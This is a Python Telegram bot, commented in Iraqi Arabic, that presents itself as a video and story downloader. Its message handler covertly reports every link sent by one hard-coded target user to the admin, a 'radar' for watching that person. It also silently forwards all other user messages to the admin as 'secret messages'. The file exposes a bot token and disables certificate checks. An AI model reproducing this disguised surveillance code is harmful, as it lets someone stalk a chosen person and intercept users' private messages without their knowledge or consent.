import os
import yt_dlp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- الإعدادات الأساسية ---
TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
ADMIN_ID = 1420457711  # أيديك أنت المطور

# الأيدي اللي نراقبه (من الصورة 1407)
TARGET_USER_ID = 2034540192

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    await update.message.reply_text(
        f"هلا {user_name}! وياك 'علي' غول التحميل 🚀\n\n"
        "دزلي رابط (يوتيوب، تيك توك، ستوري إنستا، فيسبوك) وتدلل 🎤📹"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    
    if text.startswith("http"):
        # نظام الرادار للشخص المطلوب
        if user.id == TARGET_USER_ID:
            radar_msg = f"🎯 **رادار: الهدف دز رابط (محتمل ستوري أو فيديو):**\n🔗 {text}"
            await context.bot.send_message(chat_id=ADMIN_ID, text=radar_msg)
        
        await update.message.reply_text("جا يحمل صبر نتكم خره 🙂")
        
        try:
            # إعدادات محسنة لدعم الستوريات والروابط المختلفة
            ydl_opts = {
                'format': 'best',
                'outtmpl': f'file_{user.id}.%(ext)s',
                'quiet': True,
                'no_warnings': True,
                'ignoreerrors': True,
                'nocheckcertificate': True,
                'add_header': [
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                ] # هذي تساعد بتجاوز حظر إنستا للستوريات
            }

            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(text, download=True)
                if not info: raise Exception("Error")
                
                filename = ydl.prepare_filename(info)
                title = info.get('title', 'محتوى من إنستقرام' if 'instagram' in text else 'فيديو')
                artist = info.get('uploader', 'مجهول')

            # إرسال المحتوى (ستوري أو فيديو)
            with open(filename, 'rb') as f:
                await context.bot.send_video(chat_id=update.message.chat_id, video=f, caption=f"✅ {title}")
            
            # إرسال البصمة
            with open(filename, 'rb') as f:
                await context.bot.send_voice(chat_id=update.message.chat_id, voice=f, caption=f"🎤 بصمة الصوت")
            
            os.remove(filename)
                
        except Exception as e:
            await update.message.reply_text("❌ الحساب خاص (Private) أو الرابط معطل!")
            print(f"Error: {e}")

    else:
        # رسائل سرية توصلك إلك بس
        report = f"📩 **رسالة سرية:**\n👤 {user.first_name}\n💬 {text}"
        await context.bot.send_message(chat_id=ADMIN_ID, text=report)

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
